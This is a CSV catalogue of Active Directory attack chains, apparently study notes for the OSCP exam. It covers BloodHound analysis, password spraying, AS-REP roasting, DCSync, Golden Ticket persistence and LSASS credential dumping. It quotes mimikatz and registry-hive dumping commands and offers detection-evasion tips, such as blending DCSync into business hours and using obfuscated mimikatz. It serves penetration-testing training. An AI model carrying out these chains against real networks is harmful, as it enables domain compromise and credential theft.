"id","name","description","version","category","platform","difficulty","time_estimate","oscp_relevant","notes"
"ad-bloodhound-guided-privesc","BloodHound-Guided Privilege Escalation","Complete BloodHound workflow from data collection to privilege escalation exploitation using graph analysis and custom Cypher queries.

This chain demonstrates the COMPLETE BloodHound methodology for discovering privilege escalation paths in Active Directory. Starts with data collection using bloodhound-python or SharpHound, imports data into Neo4j via BloodHound GUI, runs pre-built queries to find paths to Domain Admins, and when those fail (COMMON scenario), uses custom Cypher queries to discover non-obvious attack paths through AdminTo, HasSession, and group membership relationships.

CRITICAL OSCP PATTERN: Pre-built queries often return 'No paths found' for standard domain users. This does NOT mean no path exists - it means you need custom Cypher queries to find intermediate pivots. The writeup demonstrates: pete (standard user) had no direct path, but mike (another standard user) had AdminTo relationship with CLIENT75, which had Domain Admin service session. This path is INVISIBLE to pre-built queries but DISCOVERABLE with custom Cypher.

WHY THIS MATTERS: BloodHound is MANDATORY for OSCP AD sets. Understanding custom Cypher queries is the difference between 'no paths found' (dead end) vs finding the attack chain (domain compromise). Time investment: 20 minutes BloodHound analysis can save 2+ hours of trial-and-error lateral movement attempts.

SUCCESS RATE: High in corporate and OSCP lab environments (70-80% of AD domains have exploitable BloodHound paths). The key is knowing WHEN to use custom queries (after pre-built fail) and WHICH queries to run (AdminTo for lateral movement, HasSession for credential harvest, MemberOf for privilege escalation).","1.0.0","","","intermediate","20 minutes","True","OSCP BLOODHOUND METHODOLOGY: BloodHound is the FIRST enumeration step for AD environments. Provides complete domain relationship map in 5 minutes vs hours of manual enumeration. CRITICAL LESSON from Corp-DCSync writeup: Pre-built query 'Shortest Paths to Domain Admins' returned 'No paths found' for pete. Custom Cypher query revealed mike had AdminTo on CLIENT75, which had Domain Admin service session. This pattern is COMMON in OSCP labs - standard users don't have direct paths, but INTERMEDIATE systems do. TIME BUDGET: 5 min data collection + 5 min upload/ingest + 10 min analysis = 20 minutes MAXIMUM. If no clear path after 20 min, proceed with what you have and revisit after compromising additional accounts. EXAM TIP: Clear old BloodHound data before each new domain (Database Info → Clear Database). Cross-contamination from previous labs causes wrong attack paths. MANUAL ALTERNATIVE: If BloodHound GUI fails, parse JSON with jq: jq '.data[] | select(.Properties.name==""USER@DOMAIN.COM"")' users.json. COMPLEMENTARY TO: CrackMapExec enumeration (provides user lists for BloodHound targeting), Kerberoasting (service accounts found via BloodHound SPN queries), AS-REP roasting (pre-auth disabled users found via BloodHound)."
"ad-password-spray-safe","Safe Lockout-Aware Password Spraying","Ultra-safe password spraying attack chain with strict lockout avoidance. Discovers password policy, calculates safe spray limits, implements time-delayed spraying with observation window tracking, and maintains spray logs to prevent accidental lockouts. Critical for OSCP exam where account lockouts can fail objectives.","1.0.0","","","intermediate","90 minutes","True","OSCP EXAM CRITICAL: This chain is designed for ZERO LOCKOUT RISK. Use when: (1) OSCP exam environment (lockouts = failed objective). (2) Red team engagement with strict ROE (no disruption). (3) High-value target where stealth is paramount. (4) Strict password policy (3 attempt threshold or below). KEY DIFFERENCES from normal spray: (1) Conservative attempt limit (threshold - 2 instead of threshold - 1). (2) Extended wait time (observation window + 5 minutes buffer). (3) Spray logging to track attempts per user. (4) Single-password rounds (not batch). (5) Validation after each round. TRADE-OFF: SLOWER (requires wait periods) but ZERO RISK. TIME COMMITMENT: With 30min observation window and 5 passwords, total time = 5 passwords × 30min wait = 2.5 hours minimum. Plan accordingly for exam time management."
"ad-dcsync-linux-workflow","DCSync Linux-Only Workflow - Kali-Based Full Domain Compromise","Advanced attack chain for complete Active Directory compromise using only Kali Linux tools (no Windows host required).

Executes full DCSync attack, credential cracking, lateral movement, and Golden Ticket persistence entirely from Kali using Impacket suite. IDEAL for OSCP exam scenarios where no Windows access available or Windows AV/EDR blocking tools. RECOMMENDED approach for exam efficiency - all tools pre-installed on Kali, no file transfers needed, no AV concerns.

DETECTION RISK: Medium. Impacket generates same network signatures as native Windows tools (DRSUAPI replication, SMB/RPC traffic), but attacker-side execution means no host-based AV/EDR alerts. All forensic artifacts on DC only (no attacker machine compromise risk).","1.0.0","","","advanced","90 minutes","True","OSCP LINUX-ONLY STRATEGY: This chain demonstrates COMPLETE Active Directory compromise without touching Windows. EXAM ADVANTAGES: (1) No Windows VM needed (save resources), (2) No AV/EDR bypass required (tools run on Kali), (3) No file transfers between systems (all tools local), (4) Consistent toolset (Impacket API uniformity), (5) Faster execution (no RDP latency). IMPACKET SUITE COVERAGE: secretsdump (DCSync), ticketer (Golden Ticket), psexec/wmiexec/smbexec (lateral movement), GetNPUsers/GetUserSPNs (Kerberoasting/AS-REP roasting), all using same Python library. KERBEROS CONFIGURATION: Critical for Golden Ticket validation - must configure /etc/krb5.conf for ticket operations. EXAM REALITY CHECK: Most OSCP exam AD chains can be solved 100% from Kali - Windows access is convenience, not requirement. DETECTION PROFILE: Network-based detection same as Windows tools (DRSUAPI, SMB, Kerberos), but NO host-based forensics on attacker machine (Python process on Kali vs Mimikatz on Windows). ALTERNATIVE WORKFLOWS: If Impacket unavailable, use native Linux Kerberos tools (kinit, klist, MIT Kerberos) + CrackMapExec + custom scripts."
"ad-dcsync-mass-extraction","DCSync Mass Credential Harvesting for Lateral Movement","Advanced attack chain for comprehensive domain credential extraction and mass lateral movement.

Extracts ALL domain user hashes via DCSync full dump, performs batch password cracking with rule-based attacks, sprays Pass-the-Hash across subnet to discover local admin access, and establishes lateral movement to high-value targets. IDEAL for OSCP exam scenarios requiring domain-wide compromise.

DETECTION RISK: High. Full DCSync generates significant replication traffic (EventID 4662), PTH spray creates multiple failed logon events (EventID 4625) if unsuccessful, lateral movement triggers process creation events (EventID 4688). TRADEOFF: Speed and coverage vs stealth.","1.0.0","","","advanced","120 minutes","True","OSCP MASS EXTRACTION STRATEGY: This chain prioritizes SPEED and COVERAGE over stealth. Goal: Compromise maximum systems in minimum time. EXAM SCENARIO: Often needed when specific privilege escalation path unclear - cast wide net to find alternate routes. EXPECTED RESULTS: Enterprise domains (500-5000 users) → 20-40% password crack rate with rockyou.txt + rules, 5-15% local admin access across subnet. Small domains (50-500 users) → 40-70% crack rate (weaker passwords), 15-30% local admin. DETECTION TRADE-OFF: Full DCSync + PTH spray = HIGHLY DETECTABLE in production (blue team will notice). Acceptable for OSCP exam (no active defense). AVOID in real penetration tests unless specifically authorized for aggressive tactics. TIME BREAKDOWN: DCSync full dump (5-20 min depending on domain size), Hash transfer (1-2 min), Hashcat cracking (10-120 min depending on wordlist/rules), PTH spray (5-15 min for /24 subnet), Lateral movement (5-10 min per target). HASH MANAGEMENT: Full domain dump generates 500-5000+ NTLM hashes. CRITICAL: Organize by username, filter for valuable accounts (admin groups, service accounts), prioritize cracking efforts. ALTERNATIVE APPROACHES: If DCSync unavailable, try (1) NTDS.dit extraction via VSS shadow copy, (2) Kerberoasting for service accounts, (3) AS-REP roasting for pre-auth disabled users."
"ad-dcsync-golden-ticket","DCSync to Golden Ticket - Persistent Domain Access Chain","Advanced attack chain for achieving persistent domain-wide access via Golden Ticket forgery.

Extracts krbtgt account hash using DCSync attack (requires Domain Admin or replication rights), creates forged Kerberos TGT with Impacket ticketer.py, and validates persistent access across the domain. RECOMMENDED for OSCP exam persistence - works from Kali without Windows access.

DETECTION RISK: Medium-High. DCSync triggers replication events (EventID 4662), Golden Ticket usage harder to detect (no AS-REQ to KDC). LIFESPAN: 10 years default (krbtgt password rarely changes).","1.0.0","","","advanced","45 minutes","True","OSCP GOLDEN TICKET STRATEGY: This chain focuses on PERSISTENCE, not initial access. Golden Ticket is the END GAME after obtaining Domain Admin or replication rights. LIFESPAN: Ticket valid for 10 years by default (krbtgt NTLM hash rarely changes - often never). STEALTH: Once created, Golden Ticket allows domain-wide access WITHOUT contacting DC for authentication (no AS-REQ to KDC) - harder to detect than standard Kerberos auth. DETECTION INDICATORS: (1) DCSync phase triggers EventID 4662 (replication request from non-DC), (2) Golden Ticket usage may trigger abnormal TGS-REQ patterns, abnormal ticket lifetimes (10 years vs 10 hours), or tickets for disabled accounts. OPSEC CONSIDERATIONS: (1) Use realistic ticket lifetime (10 hours, not 10 years) to evade detection, (2) Forge ticket for existing user (not disabled/deleted accounts), (3) Execute DCSync during business hours (blend with legitimate replication), (4) Use encrypted C2 channel for hash exfiltration. EXAM TIP: Practice this chain MULTIPLE times - Golden Ticket is common OSCP persistence requirement. Time pressure = 30 minutes under exam stress. ALTERNATIVES: If DCSync unavailable, try (1) NTDS.dit extraction via VSS shadow copy, (2) Credential dumping from compromised DC (Mimikatz sekurlsa::logonpasswords), (3) Kerberoasting Domain Admin accounts. IMPACKET vs MIMIKATZ: Impacket ticketer.py RECOMMENDED for OSCP (runs on Kali, no AV concerns, seamless integration with psexec/wmiexec). Mimikatz requires Windows host and may trigger AV/EDR."
"ad-service-session-credential-harvest","Service Session Credential Harvesting","Exploit Domain Admin service sessions cached on workstations to escalate privileges from local admin to Domain Admin.

This chain demonstrates a CRITICAL OSCP pattern: Local admin access on ANY workstation is a PIVOT OPPORTUNITY, not a dead end. Domain Admins frequently run services (monitoring agents, backup clients, scheduled tasks) on workstations, which cache their credentials in LSASS memory until reboot. These 'service sessions' are identified by 'Session: Service from 0' in mimikatz output.

WHY THIS MATTERS: Service sessions are a GOLDMINE. Unlike interactive sessions (which log out), service sessions persist until reboot - often for days/weeks. A single compromised workstation with local admin + DA service session = instant domain compromise. This is MORE COMMON than you think: monitoring agents (SCOM, Nagios), backup clients (Veeam, Commvault), and scheduled tasks frequently run as Domain Admin.

CRITICAL PREREQUISITE: You MUST run 'privilege::debug' before 'sekurlsa::logonpasswords'. Even local administrators don't automatically have SeDebugPrivilege enabled. Without this, mimikatz returns 'ERROR 0x00000005 Access Denied'. This is the #1 mimikatz failure in OSCP exams.

OSCP SUCCESS RATE: High (60-70% of AD labs have exploitable service sessions). Time investment: 15 minutes from local admin to Domain Admin if service session exists. Alternative if no service sessions: pivot to more systems, check BloodHound for AdminTo relationships on additional computers.

LESSON FROM CORP-DCSYNC WRITEUP: 'Service sessions are GOLDMINE - Domain Admins running services on workstations is common misconfiguration. Local admin on workstation is PIVOT OPPORTUNITY, not dead end.'","1.0.0","","","intermediate","15 minutes (5 min lateral movement, 5 min credential dump, 5 min validation)","True","This chain targets the common misconfiguration where Domain Admin accounts run services on workstations. Service sessions cache credentials in LSASS until reboot - often for days or weeks.

CRITICAL SUCCESS FACTORS:
1. privilege::debug BEFORE sekurlsa commands (mandatory prerequisite)
2. Look for 'Session: Service from 0' in mimikatz output (not interactive sessions)
3. Verify extracted credentials belong to Domain Admins group
4. Service sessions persist until reboot (more reliable than interactive sessions)

COMMON FAILURES:
- Mimikatz without privilege::debug: Returns ERROR 0x00000005 Access Denied
- Targeting interactive sessions: These log out quickly, service sessions persist
- Not verifying group membership: Extract ALL credentials, then map to Domain Admins
- Antivirus detection: Use obfuscated mimikatz or alternative (pypykatz, procdump+offline parsing)

ALTERNATIVES IF NO SERVICE SESSIONS:
- Pivot to additional workstations (check BloodHound AdminTo relationships)
- Target servers instead of workstations (higher likelihood of service sessions)
- Use Kerberoasting for service accounts
- Check for cached credentials in registry (reg save HKLM\SAM, reg save HKLM\SECURITY)

TIME ESTIMATES FOR OSCP:
- Lateral movement to target system: 5 minutes
- Mimikatz upload and execution: 3 minutes
- Credential dump and parsing: 2 minutes
- Validation with crackmapexec: 3 minutes
- Escalation to Domain Admin: 2 minutes
- TOTAL: 15 minutes if service session exists

WHY THIS WORKS:
- Windows caches credentials in LSASS for SSO (Single Sign-On)
- Service accounts run persistently, credentials cached persistently
- Local admins can read LSASS memory (with SeDebugPrivilege)
- NTLM hashes sufficient for Pass-the-Hash (no plaintext password needed)"
"ad-attack-asreproast-full","Active Directory AS-REP Roasting Full Attack Chain","Complete AS-REP roasting attack chain from enumeration to credential validation.

Identifies users with Kerberos preauthentication disabled, extracts offline-crackable AS-REP hashes, cracks passwords with Hashcat, validates credentials, and checks for local admin rights for lateral movement opportunities.","1.0.0","","","beginner","90 minutes","True","OSCP QUICK WIN: AS-REP roasting is fast reconnaissance attack (30 seconds to identify vulnerable users, 1-60 minutes to crack). NO LOCKOUT RISK - safe to attempt even on sensitive domains. SUCCESS RATE: Variable - depends on misconfigurations (0-10% of domains have vulnerable users). DEFAULT AD SETTING: Preauthentication ENABLED (secure). Vulnerable users are rare - typically legacy service accounts or misconfigurations. LINUX vs WINDOWS: Linux (impacket-GetNPUsers) requires valid credentials. Windows (Rubeus) uses current user context (no credential entry needed). TIME SYNC CRITICAL: Kerberos requires <5 minute clock difference. Use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur. HASH FORMAT: $krb5asrep$23$ = Hashcat mode 18200 (Kerberos 5 AS-REP etype 23). CRACKING SPEED: RC4-HMAC is fast - rockyou.txt straight dictionary <1 second on GPU, 1-5 minutes with rule-based attack. COMPLEMENTARY TO PASSWORD SPRAYING: Different attack surface - may find credentials password spraying misses."
"ad-password-spray-external","Active Directory External Password Spray Attack","External password spraying attack chain from no credentials to valid domain access using Kerberos pre-authentication.

Enumerates valid usernames, sprays common passwords, validates credentials, and identifies local admin access - all from external network position with only UDP 88 access to domain controller.","1.0.0","","","intermediate","15 minutes","True","OSCP CRITICAL: This is the PRIMARY method for external password spraying. Requires ONLY UDP 88 access to DC - no SMB, LDAP, or internal network needed. Generates minimal noise (Event ID 4768/4771 - normal Kerberos traffic). SPEED: Fastest password attack method - 2 UDP packets per attempt, hundreds of attempts per second. STEALTH: Extremely low detection risk - appears as normal authentication traffic. EXAM STRATEGY: Use this when you've identified AD but have no credentials. Success rate highest with common passwords (Welcome2023!, Password123!, CompanyName2023!). CRITICAL WARNING: Does NOT check password policy - you must manually calculate safe spray limits to avoid lockouts. Recommended: max 3-4 password attempts per user per 30 minutes."
"ad-dcsync-lateral-movement","DCSync Targeted Extraction for Surgical Lateral Movement","Advanced attack chain for surgical credential extraction and precision lateral movement to high-value targets.

Identifies and prioritizes specific high-value user accounts (Domain Admins, service accounts, IT admins), extracts their credentials via targeted DCSync, validates access, and executes lateral movement to critical systems. IDEAL for OSCP scenarios requiring specific target compromise with minimal noise.

DETECTION RISK: Low-Medium. Targeted DCSync (10-50 users) generates far less replication traffic than full dump, surgical PTH validation avoids spray detection, PSExec provides SYSTEM shells for privilege escalation. TRADEOFF: Precision and stealth vs broad coverage.","1.0.0","","","advanced","60 minutes","True","OSCP TARGETED EXTRACTION STRATEGY: This chain focuses on PRECISION over coverage. Use when: (1) Exam objective specifies particular system or data, (2) Full domain dump excessive or time-constrained, (3) Stealth important (minimize detection), (4) Known high-value accounts identified through enumeration. TARGET PRIORITIZATION: (1) Domain Admins (unrestricted domain access), (2) Local Administrators on target system (direct access), (3) Service accounts with elevated privileges (SQL, Exchange, backup services), (4) IT administrators (likely admin on multiple systems). EXPECTED RESULTS: 10-20 targeted users → 50-80% crack rate (admin accounts often have stronger passwords but still vulnerable), 30-60% local admin access on target systems. TIME ADVANTAGE: Targeted approach 3-5x faster than full domain dump (5-10 min DCSync vs 20-60 min full dump). DETECTION ADVANTAGE: Targeted DCSync generates 10-50 EventID 4662 events vs thousands for full dump, surgical PTH validation avoids failed logon spam. OSCP EXAM TIP: Map user-to-system access before DCSync - enumerate local admin group membership on targets to identify which users to extract. ALTERNATIVE APPROACHES: If specific users unknown, try (1) AS-REP roasting (pre-auth disabled users), (2) Kerberoasting (service accounts), (3) Local SAM dumps from compromised workstations (may contain cached domain credentials)."
"ad-password-spray-internal","Active Directory Internal Password Spray Attack","Comprehensive internal password spraying attack chain from domain-joined Windows or internal Linux position.

Discovers password policy, enumerates users, sprays passwords using optimal method (LDAP/SMB/Kerberos), validates credentials, identifies local admin rights, and establishes lateral movement path to domain compromise.","1.0.0","","","intermediate","30 minutes","True","OSCP CRITICAL: This chain demonstrates COMPLETE internal password spraying workflow. Key decision point: Step 3 (choose-spray-method) branches into 3 parallel paths based on your position and requirements. Windows + policy-aware → PowerShell LDAP (spray-passwords-ldap). Linux + need admin detection → CrackMapExec SMB (crackmapexec-smb-spray). Linux + maximum speed/stealth → Kerbrute (kerbrute-passwordspray). ALL METHODS WORK but have different trade-offs. EXAM STRATEGY: If on Windows, use PowerShell LDAP (automatic policy compliance). If on Linux, use Kerbrute for initial spray (fast), then CrackMapExec for admin validation. TIMING: Policy check (5s) + user enum (30s) + spray (1-3min) + validation (30s) = 3-5 minutes per password. CRITICAL: ALWAYS check policy first (step 1) to avoid lockouts."
